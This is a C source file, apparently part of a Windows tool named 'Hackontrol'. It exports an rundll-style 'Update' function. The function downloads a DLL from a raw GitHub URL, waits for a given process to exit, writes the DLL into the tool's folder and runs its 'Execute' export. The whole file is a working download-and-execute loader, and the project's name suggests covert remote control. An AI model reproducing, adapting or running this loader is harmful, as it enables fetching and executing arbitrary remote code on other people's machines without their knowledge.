#include <khopanwin32.h>
#include <khopanstring.h>
#include <hackontrolcurl.h>

#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")

#define FUNCTION_LIBDLL32 L"Execute"
#define URL_LIBDLL32_FILE "https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/system/libdll32.dll"

__declspec(dllexport) void __stdcall Update(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	DataStream stream = {0};
	CURLcode code;

	if(!HackontrolDownloadData(&stream, URL_LIBDLL32_FILE, FALSE, &code)) {
		KHCURLDialogErrorW(code, L"HackontrolDownloadData");
		return;
	}

	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD) atol(argument));

	if(process) {
		WaitForSingleObject(process, INFINITE);
		CloseHandle(process);
	}

	LPWSTR pathFolderHackontrol = HackontrolGetDirectory();

	if(!pathFolderHackontrol) {
		KHWin32DialogErrorW(GetLastError(), L"HackontrolGetDirectory");
		goto freeStream;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
	FREE(pathFolderHackontrol);

	if(!pathFileLibdll32) {
		KHWin32DialogErrorW(GetLastError(), L"KHFormatMessageW");
		goto freeStream;
	}

	if(!HackontrolWriteFile(pathFileLibdll32, &stream)) {
		KHWin32DialogErrorW(GetLastError(), L"HackontrolWriteFile");
		FREE(pathFileLibdll32);
		goto freeStream;
	}

	BOOL result = KHWin32StartDynamicLibraryW(pathFileLibdll32, FUNCTION_LIBDLL32, NULL);
	FREE(pathFileLibdll32);

	if(!result) {
		KHWin32DialogErrorW(GetLastError(), L"KHWin32StartDynamicLibraryW");
	}
freeStream:
	KHDataStreamFree(&stream);
}
